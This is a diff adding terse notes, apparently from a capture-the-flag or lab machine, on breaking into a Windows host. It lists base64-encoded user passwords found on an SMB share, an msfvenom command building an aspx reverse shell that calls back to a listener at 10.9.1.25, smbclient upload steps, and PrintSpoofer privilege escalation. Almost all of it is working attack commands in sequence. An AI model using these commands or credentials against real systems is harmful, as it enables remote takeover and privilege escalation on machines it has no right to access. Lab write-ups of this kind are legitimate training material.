@@ -1,0 +1,14 @@
+- after some scan found this dir with samba and gobuster:
+IP:49663/nt4wrksv/passwords.txt
+
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw== : Bob - !P@$$W0rD!123
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk : Bill - Juw4nnaM4n420696969!$$$
+
+- it has write permission, upload reverse shell payload in aspx
+- bring ncat payload msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.25 LPORT=1338 -f aspx -o 1338.aspx
+- smbclient \\\\10.10.2.65\\nt4wrksv
+- put 1338.aspx
+- just open the damn thing.
+- privilege escalation :
+- printspoofer.exe -i -c cmd
